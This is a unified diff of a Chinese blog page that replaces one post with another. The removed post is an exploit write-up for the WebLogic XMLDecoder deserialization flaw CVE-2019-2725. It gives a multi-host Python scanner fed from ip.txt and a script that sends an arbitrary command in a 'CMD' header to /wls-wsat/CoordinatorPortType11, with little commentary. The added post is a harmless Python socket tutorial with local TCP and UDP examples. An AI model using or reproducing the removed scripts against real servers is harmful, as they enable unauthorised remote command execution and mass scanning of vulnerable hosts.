@@ -86,17 +86,23 @@
 
 
 
-<meta name="description" content="利用点是weblogic的xmldecoder反序列化漏洞，只是构造巧妙的利用链对Oracle官方历年来对这个漏洞点的补丁绕过主要来还是懒  废话不多说直接上exp和poc 吧  poc并不通用 更多用exp吧    IP填入ip.txt 后用poc检测  POCimport requests import sys import time import random import threadi">
+<meta name="description" content="客户端/服务器架构服务端提供服务 客户端请求服务 套接字：通信端点套接字是计算机网络数据结构，它体现了“通信端点”的概念。 在任何类型的通信开始之前，网络应用程序必须创建套接字。 可以将它们比作电话插孔，没有它将无法进行通信。 Python 中的网络编程socket()模块函数  要创建套接字，必须使用 socket.socket()函数，它一般的语法如下。 socket(socket_famil">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Weblogic反序列化远程代码执行漏洞exp(CVE-2019-2725)">
-<meta property="og:url" content="http://MaiKeFee.com/archives/4a706105.html">
+<meta property="og:title" content="Python-网络编程">
+<meta property="og:url" content="http://MaiKeFee.com/archives/c0f9c454.html">
 <meta property="og:site_name" content="MaiKeFee|">
-<meta property="og:description" content="利用点是weblogic的xmldecoder反序列化漏洞，只是构造巧妙的利用链对Oracle官方历年来对这个漏洞点的补丁绕过主要来还是懒  废话不多说直接上exp和poc 吧  poc并不通用 更多用exp吧    IP填入ip.txt 后用poc检测  POCimport requests import sys import time import random import threadi">
+<meta property="og:description" content="客户端/服务器架构服务端提供服务 客户端请求服务 套接字：通信端点套接字是计算机网络数据结构，它体现了“通信端点”的概念。 在任何类型的通信开始之前，网络应用程序必须创建套接字。 可以将它们比作电话插孔，没有它将无法进行通信。 Python 中的网络编程socket()模块函数  要创建套接字，必须使用 socket.socket()函数，它一般的语法如下。 socket(socket_famil">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-09-08T14:58:02.243Z">
+<meta property="og:image" content="http://maikefee.com/images/WX20190919-020511.png">
+<meta property="og:image" content="http://maikefee.com/images/WX20190919-020609.png">
+<meta property="og:image" content="http://maikefee.com/images/WX20190919-020639.png">
+<meta property="og:image" content="http://maikefee.com/images/1610491-20190328180443455-1854119774.png">
+<meta property="og:image" content="http://maikefee.com/images/1610491-20190328180505783-2124516360.png">
+<meta property="og:updated_time" content="2019-09-18T18:09:29.481Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Weblogic反序列化远程代码执行漏洞exp(CVE-2019-2725)">
-<meta name="twitter:description" content="利用点是weblogic的xmldecoder反序列化漏洞，只是构造巧妙的利用链对Oracle官方历年来对这个漏洞点的补丁绕过主要来还是懒  废话不多说直接上exp和poc 吧  poc并不通用 更多用exp吧    IP填入ip.txt 后用poc检测  POCimport requests import sys import time import random import threadi">
+<meta name="twitter:title" content="Python-网络编程">
+<meta name="twitter:description" content="客户端/服务器架构服务端提供服务 客户端请求服务 套接字：通信端点套接字是计算机网络数据结构，它体现了“通信端点”的概念。 在任何类型的通信开始之前，网络应用程序必须创建套接字。 可以将它们比作电话插孔，没有它将无法进行通信。 Python 中的网络编程socket()模块函数  要创建套接字，必须使用 socket.socket()函数，它一般的语法如下。 socket(socket_famil">
+<meta name="twitter:image" content="http://maikefee.com/images/WX20190919-020511.png">
 
 
 
@@ -126,13 +132,13 @@
 
 
 
-  <link rel="canonical" href="http://MaiKeFee.com/archives/4a706105.html">
+  <link rel="canonical" href="http://MaiKeFee.com/archives/c0f9c454.html">
 
 
 
 
 
-  <title>Weblogic反序列化远程代码执行漏洞exp(CVE-2019-2725) | MaiKeFee|</title>
+  <title>Python-网络编程 | MaiKeFee|</title>
   
 
 
@@ -312,7 +318,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://MaiKeFee.com/archives/4a706105.html">
+    <link itemprop="mainEntityOfPage" href="http://MaiKeFee.com/archives/c0f9c454.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="MaiKeFee">
@@ -329,7 +335,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Weblogic反序列化远程代码执行漏洞exp(CVE-2019-2725)</h1>
+          <h1 class="post-title" itemprop="name headline">Python-网络编程</h1>
         
 
         <div class="post-meta">
@@ -341,8 +347,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-08T22:48:57+08:00">
-                2019-09-08
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-19T02:02:55+08:00">
+                2019-09-19
               </time>
             
 
@@ -357,8 +363,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-09-08T22:58:02+08:00">
-                2019-09-08
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-19T02:09:29+08:00">
+                2019-09-19
               </time>
             
           </span>
@@ -376,8 +382,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
+                  <a href="/categories/编程开发/" itemprop="url" rel="index">
+                    <span itemprop="name">编程开发</span>
                   </a>
                 </span>
 
@@ -387,41 +393,8 @@
                 
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/漏洞挖掘/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞挖掘</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/漏洞挖掘/常见漏洞/" itemprop="url" rel="index">
-                    <span itemprop="name">常见漏洞</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/漏洞挖掘/常见漏洞/中间件/" itemprop="url" rel="index">
-                    <span itemprop="name">中间件</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/漏洞挖掘/常见漏洞/中间件/WebLogic/" itemprop="url" rel="index">
-                    <span itemprop="name">WebLogic</span>
+                  <a href="/categories/编程开发/Python/" itemprop="url" rel="index">
+                    <span itemprop="name">Python</span>
                   </a>
                 </span>
 
@@ -438,8 +411,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/archives/4a706105.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/archives/4a706105.html" itemprop="commentCount"></span>
+                <a href="/archives/c0f9c454.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/archives/c0f9c454.html" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -447,7 +420,7 @@
 
           
           
-             <span id="/archives/4a706105.html" class="leancloud_visitors" data-flag-title="Weblogic反序列化远程代码执行漏洞exp(CVE-2019-2725)">
+             <span id="/archives/c0f9c454.html" class="leancloud_visitors" data-flag-title="Python-网络编程">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -473,7 +446,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  361
+                  683
                 </span>
               
 
@@ -489,7 +462,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  2
+                  3
                 </span>
               
             </div>
@@ -510,70 +483,111 @@
       
 
       
-        <blockquote>
-<p>利用点是weblogic的xmldecoder反序列化漏洞，只是构造巧妙的利用链对Oracle官方历年来对这个漏洞点的补丁绕过<br>主要来还是懒  废话不多说直接上exp和poc 吧  poc并不通用 更多用exp吧 </p>
+        <h1 id="客户端-服务器架构"><a href="#客户端-服务器架构" class="headerlink" title="客户端/服务器架构"></a>客户端/服务器架构</h1><p>服务端提供服务</p>
+<p>客户端请求服务</p>
+<h1 id="套接字：通信端点"><a href="#套接字：通信端点" class="headerlink" title="套接字：通信端点"></a>套接字：通信端点</h1><p>套接字是计算机网络数据结构，它体现了“通信端点”的概念。</p>
+<p>在任何类型的通信开始之前，网络应用程序必须创建套接字。</p>
+<p>可以将它们比作电话插孔，没有它将无法进行通信。</p>
+<h1 id="Python-中的网络编程"><a href="#Python-中的网络编程" class="headerlink" title="Python 中的网络编程"></a>Python 中的网络编程</h1><p>socket()模块函数</p>
+<ul>
+<li><p>要创建套接字，必须使用 socket.socket()函数，它一般的语法如下。</p>
+<pre><code>socket(socket_family, socket_type, protocol=0)</code></pre></li>
+</ul>
+<blockquote>
+<p>socket_family 是 AF_UNIX 或 AF_INET</p>
 </blockquote>
 <blockquote>
-<p>IP填入ip.txt 后用poc检测</p>
+<p>socket_type 是 SOCK_STREAM或 SOCK_DGRAM</p>
 </blockquote>
-<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code>import requests
-import sys
-import time
-import random
-import threading
-def exec_cmd(ip,cmd):
-    url=&quot;http://&quot;+ip+&quot;/wls-wsat/CoordinatorPortType11&quot;
-    headers={
-    &apos;User-Agent&apos;: &apos;Apache-HttpClient/4.1.1 (java 1.5)&apos;,
-    &apos;CMD&apos; : cmd,
-    &apos;SOAPAction&apos;:&apos;&quot;&quot;&apos;,
-    &apos;Content-Type&apos;:&apos;text/xml&apos;
-    }
-    with open(&apos;payload.txt&apos;,&apos;rb&apos;) as f :
-        payloads=f.read()
-    r=requests.post(url,headers=headers,data=payloads,timeout=5)
-    return r.content.decode()
-def test_poc(ip):
-    check=str(int(time.time())+int(random.uniform(1000,9999)))
-    out=exec_cmd(ip,&apos;echo &apos;+check)
-    if check in out:
-        print(&apos;vul finds:&apos;+ip)
-def main(): 
-    print(&quot;put ips in ip.txt &quot;)
-    with open(&apos;ip.txt&apos;) as f:
-        for line in f.readlines():
-            try:
-                test_poc(line)
-            except :
-                pass
-    print(&quot;End&quot;)        
-if __name__ == &apos;__main__&apos;:
-    main()</code></pre><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><pre><code>import requests
-import sys
-def exec_cmd(ip,cmd):
-    url=&quot;http://&quot;+ip+&quot;/wls-wsat/CoordinatorPortType11&quot;
-    headers={
-    &apos;User-Agent&apos;: &apos;Apache-HttpClient/4.1.1 (java 1.5)&apos;,
-    &apos;CMD&apos; : cmd,
-    &apos;SOAPAction&apos;:&apos;&quot;&quot;&apos;,
-    &apos;Content-Type&apos;:&apos;text/xml&apos;
-    }
-    with open(&apos;payload.txt&apos;,&apos;rb&apos;) as f :
-        payloads=f.read()
-    r=requests.post(url,headers=headers,data=payloads)
-    return r.content.decode()
-def main():
-    if len(sys.argv)&lt;3:
-        print(&apos;usage:exp.py www.0dayhack.com:8080 whoami&apos;)
-        sys.exit()
-    ip=sys.argv[1]
-    cmd=sys.argv[2]
-    out=exec_cmd(ip,cmd)
-    print(out)
-if __name__ == &apos;__main__&apos;:
-    main()</code></pre><blockquote>
-<p>注意:<br>只支持Py3<br>ip.txt是放检测的</p>
+<blockquote>
+<p>protocol 通常省略，默认为 0</p>
 </blockquote>
+<p>使用以下方式创建TCP/UDP套接字:</p>
+<pre><code>from socket import *
+​
+TCPSock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+​
+UDPSpck=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</code></pre><h1 id="套接字对象（内置）方法"><a href="#套接字对象（内置）方法" class="headerlink" title="套接字对象（内置）方法"></a>套接字对象（内置）方法</h1><h2 id="常见的套接字对象方法和属性"><a href="#常见的套接字对象方法和属性" class="headerlink" title="常见的套接字对象方法和属性"></a>常见的套接字对象方法和属性</h2><p><img src="/images/WX20190919-020511.png" alt></p>
+<p><img src="/images/WX20190919-020609.png" alt></p>
+<p><img src="/images/WX20190919-020639.png" alt></p>
+<h2 id="创建TCP服务器"><a href="#创建TCP服务器" class="headerlink" title="创建TCP服务器"></a>创建TCP服务器</h2><pre><code>#!/usr/bin/env/python3
+#-*- coding:utf8 -*-
+import socket
+import sys
+​
+Server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 创建服务端套接字
+​
+HOST = &apos;127.0.0.1&apos;
+PORT = 9999
+ADDRS=(HOST,PORT)
+Server.bind(ADDRS)  #绑定IP，Port
+Server.listen(2)    #最大连接数
+print(&quot;正在监听:%s:%d&quot;%(HOST,PORT))
+​
+while True: #服务器无限循环
+    Client, addr = Server.accept()  #接受客户端连接
+    print(&quot;连接来自:%s&quot; % str(addr))    #打印客户端连接IP
+    msg = &apos;Wlecome to here!\n&apos;
+    #send()和recv()的数据格式都是bytes。
+    # (str和bytes的相互转化，用encode()和decode(),或者用bytes()和str())
+    while True:
+        Client.send(msg.encode(&quot;utf-8&quot;)) # 发送欢迎标语
+        msg = Client.recv(1024)    #接受并输出信息
+        print(&quot;接收到客户端数据:%s&quot; % msg.decode(&quot;utf-8&quot;))
+        msg=input(&apos;输入&gt;&apos;)    # 输入信息
+    Client.close()
+Server.close()</code></pre><h2 id="创建TCP客户端"><a href="#创建TCP客户端" class="headerlink" title="创建TCP客户端"></a>创建TCP客户端</h2><pre><code>#!/usr/bin/env/python3
+#-*- coding:utf8 -*-
+import socket
+​
+Client= socket.socket(socket.AF_INET,socket.SOCK_STREAM)    # 创建客户端套接字
+​
+HOST = &apos;127.0.0.1&apos;
+PORT = 9999
+ADDRS=(HOST,PORT)
+Client.connect(ADDRS)  # 连接服务器
+while True:
+    msg = Client.recv(1024)
+    print(&quot;接受到服务端数据：%s&quot; % msg.decode(&quot;utf-8&quot;))
+    msg = input(&apos;输入&gt;&apos;)
+    Client.send(msg.encode(&quot;utf-8&quot;))
+Client.close()</code></pre><p>运行结果:</p>
+<p><img src="/images/1610491-20190328180443455-1854119774.png" alt></p>
+<h2 id="创建UDP服务器"><a href="#创建UDP服务器" class="headerlink" title="创建UDP服务器"></a>创建UDP服务器</h2><pre><code>#!/usr/bin/env python3
+#-*- coding:utf8 -*-
+import socket
+​
+HOST=&apos;127.0.0.1&apos;
+PORT=9999
+ADDR=(HOST,PORT)
+BUFSIZE=1024
+​
+Server=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+Server.bind(ADDR)
+print(&quot;正在监听 %s:%d&quot; % (HOST,PORT) )
+while True:
+    msg,ADDR=Server.recvfrom(BUFSIZE)
+    print(&quot;接收到来自客户端的数据:%s&quot; % msg.decode(&quot;utf-8&quot;))
+    msg=input(&apos;输入&gt;&apos;)
+    Server.sendto(msg.encode(&quot;utf-8&quot;),ADDR)
+Server.close()</code></pre><h2 id="创建UDP客户端"><a href="#创建UDP客户端" class="headerlink" title="创建UDP客户端"></a>创建UDP客户端</h2><pre><code>#!/usr/bin/env python3
+#-*- coding:utf8 -*-
+​
+import socket
+​
+HOST=&apos;127.0.0.1&apos;
+PORT=9999
+ADDR=(HOST,PORT)
+BUFSIZE=1024
+​
+Client=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+while True:
+    msg = input(&apos;输入&gt;&apos;)
+    Client.sendto(msg.encode(&quot;utf-8&quot;),ADDR)
+    msg,ADDR=Client.recvfrom(BUFSIZE)
+    print(&quot;接收到服务端的数据:%s&quot; % msg.decode(&quot;utf-8&quot;))
+Client.close()</code></pre><p>运行结果:</p>
+<p><img src="/images/1610491-20190328180505783-2124516360.png" alt></p>
 
       
     </div>
@@ -600,12 +614,12 @@ if __name__ == &apos;__main__&apos;:
   <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
   <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
 
-  <p><span>本文标题:</span>Weblogic反序列化远程代码执行漏洞exp(CVE-2019-2725)</p>
+  <p><span>本文标题:</span>Python-网络编程</p>
   <p><span>文章作者:</span>MaiKeFee</p>
-  <p><span>发布时间:</span>2019年09月08日</p>
-  <p><span>最后更新:</span>2019年09月08日</p>
-  <p><span>原始链接:</span><a href="/archives/4a706105.html" title="Weblogic反序列化远程代码执行漏洞exp(CVE-2019-2725)">http://MaiKeFee.com/archives/4a706105.html</a>
-    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://MaiKeFee.com/archives/4a706105.html" aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2019年09月19日</p>
+  <p><span>最后更新:</span>2019年09月19日</p>
+  <p><span>原始链接:</span><a href="/archives/c0f9c454.html" title="Python-网络编程">http://MaiKeFee.com/archives/c0f9c454.html</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://MaiKeFee.com/archives/c0f9c454.html" aria-label="复制成功！"></i></span>
   </p>
   
 </div>
@@ -643,8 +657,8 @@ if __name__ == &apos;__main__&apos;:
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/archives/aa15bbdb.html" rel="next" title="常见古典密码及在线工具">
-                <i class="fa fa-chevron-left"></i> 常见古典密码及在线工具
+              <a href="/archives/64be7bf2.html" rel="next" title="Python-多线程编程">
+                <i class="fa fa-chevron-left"></i> Python-多线程编程
               </a>
             
           </div>
@@ -652,10 +666,6 @@ if __name__ == &apos;__main__&apos;:
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/archives/d405928.html" rel="prev" title="WAF之安全狗绕过方法">
-                WAF之安全狗绕过方法 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
           
@@ -855,7 +865,7 @@ if __name__ == &apos;__main__&apos;:
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#POC"><span class="nav-number">1.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#exp"><span class="nav-number">2.</span> <span class="nav-text">exp</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#客户端-服务器架构"><span class="nav-number">1.</span> <span class="nav-text">客户端/服务器架构</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#套接字：通信端点"><span class="nav-number">2.</span> <span class="nav-text">套接字：通信端点</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Python-中的网络编程"><span class="nav-number">3.</span> <span class="nav-text">Python 中的网络编程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#套接字对象（内置）方法"><span class="nav-number">4.</span> <span class="nav-text">套接字对象（内置）方法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#常见的套接字对象方法和属性"><span class="nav-number">4.1.</span> <span class="nav-text">常见的套接字对象方法和属性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#创建TCP服务器"><span class="nav-number">4.2.</span> <span class="nav-text">创建TCP服务器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#创建TCP客户端"><span class="nav-number">4.3.</span> <span class="nav-text">创建TCP客户端</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#创建UDP服务器"><span class="nav-number">4.4.</span> <span class="nav-text">创建UDP服务器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#创建UDP客户端"><span class="nav-number">4.5.</span> <span class="nav-text">创建UDP客户端</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -1581,13 +1591,13 @@ if __name__ == &apos;__main__&apos;:
       var articles = db.collection('articles')
 
       //https://hexo.io/zh-tw/docs/variables.html
-      var isPost = 'Weblogic反序列化远程代码执行漏洞exp(CVE-2019-2725)'.length > 0
+      var isPost = 'Python-网络编程'.length > 0
       var isArchive = '' === 'true'
       var isCategory = ''.length > 0
       var isTag = ''.length > 0
 
       if (isPost) { //is article page
-        var title = 'Weblogic反序列化远程代码执行漏洞exp(CVE-2019-2725)'
+        var title = 'Python-网络编程'
         var doc = articles.doc(title)
 
         getCount(doc, true).then(appendCountTo($('.post-meta')))
